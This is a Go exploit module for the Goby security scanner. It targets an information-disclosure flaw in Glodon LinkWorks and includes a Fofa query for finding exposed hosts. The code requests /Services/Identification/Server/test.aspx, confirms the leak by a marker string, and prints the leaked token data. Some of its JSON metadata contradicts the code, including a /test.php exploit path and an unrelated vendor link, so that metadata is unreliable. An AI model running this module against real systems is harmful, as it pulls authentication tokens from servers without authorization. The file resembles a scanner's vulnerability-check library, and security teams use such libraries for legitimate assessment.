package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "GlodonLinkWorks test.aspx Information Disclosure Vulnerability",
    "Description": "<p>LinkWorks (also known as GlinkLink or GTP LinkWorks) is a BIM (Building Information Modeling) collaborative platform developed by Glodon. Guanglian Da is one of China's leading providers of digital construction technology, focusing on providing digital solutions for the construction, engineering, and architectural design industries.</p>",
    "Product": "Glodon LinkWorks",
    "Homepage": "https://www.glodon.com/index.html",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-09-13",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "body=\"Services\" && (body=\"/Identification/login.ashx\" || header=\"/Identification/login.ashx\" || banner=\"/Identification/login.ashx\")",
    "GobyQuery": "body=\"Services\" && (body=\"/Identification/login.ashx\" || header=\"/Identification/login.ashx\" || banner=\"/Identification/login.ashx\")",
    "Level": "0",
    "Impact": "<p>Its  interface has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "token",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "2H1W"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "广联达LinkWorks test.aspx 信息泄露漏洞",
            "Product": "广联达LinkWorks",
            "Description": "<p>LinkWorks（也称为 GlinkLink 或 GTP-LinkWorks）是广联达公司（Glodon）开发的一种BIM（建筑信息模型）协同平台。广联达是中国领先的数字建造技术提供商之一，专注于为建筑、工程和建筑设计行业提供数字化解决方案。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其 test.aspx 接口存在信息泄露漏洞，未经授权的攻击者访问，可能会获得敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "GlodonLinkWorks test.aspx Information Disclosure Vulnerability",
            "Product": "Glodon LinkWorks",
            "Description": "<p>LinkWorks (also known as GlinkLink or GTP LinkWorks) is a BIM (Building Information Modeling) collaborative platform developed by Glodon. Guanglian Da is one of China's leading providers of digital construction technology, focusing on providing digital solutions for the construction, engineering, and architectural design industries.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Its&nbsp; interface has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`

	postOrGet_XeyP9U3OMx := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "//Services/Identification/Server/test.aspx"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/Services/Identification/Server/test.aspx": "token 过期时间设定",
			}
			// 函数继承
			uploadFileFunc := postOrGet_XeyP9U3OMx

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"token": {"/Services/Identification/Server/test.aspx", "token 过期时间设定"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_XeyP9U3OMx

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "泄露信息：token信息\n" + resp
			return expResult
		},
	))
}
